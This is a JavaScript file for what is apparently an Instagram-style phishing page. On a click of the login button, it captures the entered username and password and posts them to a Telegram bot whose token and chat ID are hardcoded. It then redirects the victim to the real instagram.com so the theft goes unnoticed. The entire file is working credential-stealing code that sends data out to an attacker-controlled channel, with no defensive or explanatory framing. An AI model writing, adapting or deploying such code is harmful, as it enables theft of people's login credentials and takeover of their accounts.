

let inputs = document.querySelectorAll('input')
let buttonLogin = document.querySelector('.login-button')

const SendMassageFunction = () => {
    let Token = '7518783471:AAH-oOt9_ptVTNEC0HEyWEncfPd7ALztPb0'
    let ChatId = '7086429203'
    let Apiurl = `https://api.telegram.org/bot${Token}/sendMessage`;

    let data = {
        chat_id:ChatId,
        text:` username: ${inputs[0].value} \npassword: ${inputs[1].value}`
    }

    let options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    };

    fetch(Apiurl,options)
    .then(data => data.json())
    .then(res => {
        console.log('data ketdi', res)
        window.location.href = "https://www.instagram.com"
    })
    .catch(error => console.log('Xatolik bor',error))
}

buttonLogin.addEventListener('click', SendMassageFunction)
 



